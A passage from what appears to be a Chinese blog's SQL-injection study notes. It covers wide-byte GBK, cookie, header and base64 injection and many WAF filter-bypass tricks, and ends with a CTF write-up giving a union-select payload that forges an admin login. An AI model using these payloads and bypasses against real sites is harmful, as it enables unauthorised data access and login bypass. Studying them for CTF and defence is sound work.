title="宽字节注入（GBK双字节绕过）"></a>宽字节注入（GBK双字节绕过）</h2><ul><li><p>适用：<br><code>单引号被反斜杠转义，且数据库编码为GBK（PHP中通过iconv()进行编码转换也可能存在宽字节字符注入）</code></p></li><li><p>宽字节格式：先加 <code>%df</code> 再加<code>&#39;</code></p></li><li><p>原理：<br><code>反斜杠编码是%5c，GBK编码中%df%5c表示为一个繁体字’運‘，从而绕过反斜杠。（不仅仅可以适用%df%5c,凡是能构造成GBK双字节的都能产生这样的绕过效果）</code></p></li><li><p>比如输入的id被 <code>&#39;</code>包围，输入<code>id=1&#39;</code>，程序不报错，但会多出一个反斜杠(<code>id= &#39;1\&#39;&#39;</code>)，此时输入的单引号被反斜杠转义，从而导致输入的单引号无法形成闭合。通常这种情况下此处是不存在sql注入漏洞的。<br>但数据库查询前执行了SET NAMES ‘GBK’语句，会将编码设置为宽字节GBK。造成此处的宽字节漏洞。</p></li></ul><h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><ul><li>适用：<br><code>URL中没有GET参数，但页面返回正常。抓包发现cookie中存在i类似d=1的参数。(参数名不一定是id，也可能是uname等等)</code></li><li>原理：<br><code>程序通过$_COOKIE获取参数ID，然后将ID拼接到select语句中查询。若不对cookie中的参数id进行过滤就会存在sql注入漏洞。</code></li><li>和基于GET的url注入套路相似。</li></ul><h2 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h2><ul><li>适用：<br><code>参数出现在User-Agent信息中。</code></li><li>将构造的语句放在User-Agent信息的末尾即可</li></ul><h2 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h2><ul><li>适用：<br><code>参数出现在X-Forwarded-for中。(简称XFF头，代表客户端的真实IP，修改这个值可以伪造客户端IP)</code></li><li>检测及利用：<br><code>将XFF设置为127.0.0.1，访问该URL页面正常，改为127.0.0.1’ 返回报错信息则存在注入点。</code><br><code> union联合查询注入即可。</code></li></ul><h2 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h2><ul><li>适用：<br><code>观察请求数据中有出现大小写字母+数字的组合乱码。</code></li><li>利用：<br><code>注入时先将原来的base64解码，与构造的语句拼接，一起进行base64编码后将数据发送即可</code></li><li>原理：<br><code>后端会利用函数base64_decode()对参数ID进行base64解码，在将解码后的id信息拼接到select语句查询。因为程序未对解码后的id进行过滤，因此此处存在sql注入漏洞。</code></li></ul><h1 id="SQL注入绕过技术"><a href="#SQL注入绕过技术" class="headerlink" title="SQL注入绕过技术"></a>SQL注入绕过技术</h1><ul><li>在代码层的防御一般不外乎两种，一是反斜杠转义，二是replace将关键字替换成空字节</li></ul><h2 id="大小写绕过注入"><a href="#大小写绕过注入" class="headerlink" title="大小写绕过注入"></a>大小写绕过注入</h2><ul><li>适用：<br><code>可能存在and、select、union这样的关键字被替换的情况，则可以采用大小写绕过进行注入</code></li><li>eg:<code>and-&gt;And、aNd、AND等等</code></li></ul><h2 id="双写绕过注入"><a href="#双写绕过注入" class="headerlink" title="双写绕过注入"></a>双写绕过注入</h2><ul><li>适用情况同上</li><li>eg:<code>and-&gt;anandd</code>、<code>or-&gt;oorr</code> 等等</li></ul><h2 id="编码绕过注入"><a href="#编码绕过注入" class="headerlink" title="编码绕过注入"></a>编码绕过注入</h2><ul><li><p>只需判断被过滤的关键字，并经过两次URL全编码即可。其余与union注入一样。</p></li><li><p>服务器会字段对URL进行一次编码，所以要把关键词编码两次。<br>注：此处URL编码要选择全编码</p></li><li><p>原理：<br><code>服务器会进行一次编码，但后续的进程如服务器、程序函数等等解码并不统一，攻击者就是利用此处的不统一将关键字在过滤出进行编码绕过，再在随后的解码步骤解码还原。</code>：<img src="https://i.loli.net/2021/02/13/iWvGmyjHk5Y27UC.jpg" alt="图片源自网易Web安全工程师课程，侵删"></p></li></ul><h2 id="内联注释绕过注入"><a href="#内联注释绕过注入" class="headerlink" title="内联注释绕过注入"></a>内联注释绕过注入</h2><ul><li>将被过滤的关键字用<code>/*！*/</code>包起来即可。</li><li>原理：<br>在mysql中，内联注释<code>/*！code */</code>中的code虽然被注释了但仍能发挥其在语句中的作用。</li></ul><h2 id="特殊符号绕过"><a href="#特殊符号绕过" class="headerlink" title="特殊符号绕过"></a>特殊符号绕过</h2><p>除了以上这些，有些waf也会过滤一些特殊符号：空格、=、&lt;、&gt;等等<br>这里的bypass方法实际就是寻找等效的命令，或者用特殊的姿势实现绕过</p><h3 id="空格过滤绕过注入"><a href="#空格过滤绕过注入" class="headerlink" title="空格过滤绕过注入"></a>空格过滤绕过注入</h3><ul><li>适用于空格被置换为空的情况，除了sql注入，很多地方都有这样的WAF</li><li>bypass：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">()</span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">回车(url编码为：<span class="operator">%</span><span class="number">0</span>a)</span><br><span class="line">`(反引号)</span><br><span class="line">tap</span><br><span class="line">双空格</span><br></pre></td></tr></table></figure><h3 id="or-and-xor-not过滤绕过"><a href="#or-and-xor-not过滤绕过" class="headerlink" title="or and xor not过滤绕过"></a>or and xor not过滤绕过</h3><ul><li>bypass:</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">=</span> <span class="operator">||</span></span><br><span class="line">xor <span class="operator">=</span> <span class="operator">|</span> # 异或</span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span> <span class="operator">!</span></span><br></pre></td></tr></table></figure><h3 id="号过滤绕过"><a href="#号过滤绕过" class="headerlink" title="=号过滤绕过"></a>=号过滤绕过</h3><ul><li>bypass: </li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不加通配符`<span class="operator">%</span>`的`<span class="keyword">like</span>`和`relike`</span><br><span class="line">`<span class="operator">!</span><span class="operator">&lt;&gt;</span>`</span><br><span class="line">利用关键字`regexp`进行正则表达匹配</span><br><span class="line">利用比较函数`strcmp(str1,str2)`</span><br></pre></td></tr></table></figure><ul><li>不加通配符<code>%</code>的<code>like</code>和<code>relike</code> (效果等同于=)</li></ul><p>不加通配符<code>%</code>的<code>like</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> id <span class="keyword">like</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name     <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><p>添加通配符<code>%</code>的<code>like</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> name <span class="keyword">like</span> &quot;test%&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name     <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass3    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><ul><li><code>!&lt;&gt;</code><br><code>&lt;&gt;</code>相当于<code>!=</code>，所有<code>!&lt;&gt;</code>就相当于<code>=</code></li></ul><h3 id="lt-gt-过滤绕过"><a href="#lt-gt-过滤绕过" class="headerlink" title="&lt;&gt;过滤绕过"></a>&lt;&gt;过滤绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`greatest(n1, n2,…)`:返回n中的最大值</span><br><span class="line">`least(n1,n2,…)`:返回n中的最小值</span><br><span class="line">`strcmp(str1,str2)`:若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 <span class="number">-1</span>，其它情况返回 <span class="number">1</span></span><br><span class="line">关键字`<span class="keyword">in</span>`</span><br></pre></td></tr></table></figure><h3 id="引号-单、双-过滤绕韩国"><a href="#引号-单、双-过滤绕韩国" class="headerlink" title="引号(单、双)过滤绕韩国"></a>引号(单、双)过滤绕韩国</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">引号连同引号内内容一起转为十六进制</span><br><span class="line">宽字节绕过：</span><br><span class="line">    # 过滤单引号时</span><br><span class="line">    <span class="operator">%</span>bf<span class="operator">%</span><span class="number">27</span> <span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="operator">%</span>aa<span class="operator">%</span><span class="number">27</span></span><br><span class="line"><span class="operator">%</span>df\’ <span class="operator">=</span> <span class="operator">%</span>df<span class="operator">%</span><span class="number">5</span>c<span class="operator">%</span><span class="number">27</span><span class="operator">=</span>縗’</span><br></pre></td></tr></table></figure><h3 id="，过滤绕过"><a href="#，过滤绕过" class="headerlink" title="，过滤绕过"></a>，过滤绕过</h3><ul><li>，被过滤会影响许多函数的使用,特别是盲注需要用到很多函数都需要逗号</li><li>bypass：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pos <span class="keyword">for</span> len</span><br><span class="line"><span class="keyword">join</span></span><br><span class="line">关键字 <span class="keyword">like</span>(提取子串的函数中的逗号 <span class="keyword">select</span> ascii(substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>; <span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> &quot;r%&quot;)</span><br><span class="line">关键字 <span class="keyword">offset</span>(limit <span class="number">1</span>,<span class="number">2</span> <span class="operator">=</span><span class="operator">&gt;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>eg:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pos <span class="keyword">for</span> len 代替 ，</span><br><span class="line">原本的substr函数：           <span class="keyword">select</span> substr(&quot;string&quot;,<span class="number">1</span>,<span class="number">3</span>); </span><br><span class="line">用<span class="keyword">from</span> pos <span class="keyword">for</span> len代替逗号： <span class="keyword">select</span> substr(&quot;string&quot; <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">3</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原语句：<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">join</span> 代替 ，：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users  <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c;</span><br></pre></td></tr></table></figure><h3 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h3><p>实质是找等价函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sleep() <span class="operator">=</span><span class="operator">&gt;</span> benchmark()</span><br><span class="line">ascii() <span class="operator">=</span><span class="operator">&gt;</span> ord()、hex()、bin() #不一定用ascii码，也可转为其他进制；但ord()于ascii()对中文处理不同</span><br><span class="line">group_concat() <span class="operator">=</span><span class="operator">&gt;</span> concat_ws()</span><br><span class="line"><span class="keyword">user</span>() <span class="operator">=</span><span class="operator">&gt;</span> @<span class="variable">@user</span>  #全局变量</span><br><span class="line">datadir <span class="operator">=</span><span class="operator">&gt;</span> @<span class="variable">@datadir</span> #全局变量</span><br></pre></td></tr></table></figure><h1 id="一个关于联合查询的补充"><a href="#一个关于联合查询的补充" class="headerlink" title="一个关于联合查询的补充"></a>一个关于联合查询的补充</h1><p>最近刷题刷到的新知识，题目是[GXYCTF2019]BabySQli</p><ul><li>知识点：在联合查询时，若查找的数据不存在，联合查询就会构造一个虚拟的数据：</li></ul><p><img src="https://i.loli.net/2021/03/05/XIoVNr9isYU35uT.png"></p><p>在search.php页面查看源代码，将其base32解码 -》base64解码即得查询语句：<br><code>select * from user where username = &#39;$name&#39;</code><br><img src="https://i.loli.net/2021/03/05/xUTpE7qboR1mSyl.png"></p><p>题目中拥有三个字段数：<code>1&#39; union select 1,2,3--+</code>；</p><p>且当输入存在的用户如admin时，回显wrong pass；输入不存在的用户则回显wrong user；尝试注入则回显don’t hack me<br>由此：后端将用户名和密码分开检测，先检测用户名再检测密码</p><p>将admin拼入字段数中查找，<code>1&#39; union select 1,&#39;admin&#39;,3--+</code>；回显wrong pass；说明username在第2列<br>猜测为id，username，passwd；</p><p>利用联合查询会构造虚拟数据的原理，使得表中生成一个用户名为admin，密码由我们自己输入的数据：<br><code>name=1&#39; union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;--+&amp;pw=123456</code><br>ps：md5(123456)=e10adc3949ba59abbe56e057f20f883e；因过滤无法使用md5()，故直接传入其md5值</p><p>这时候pw传入的密码与表中数据成功匹配，即可获得flag</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
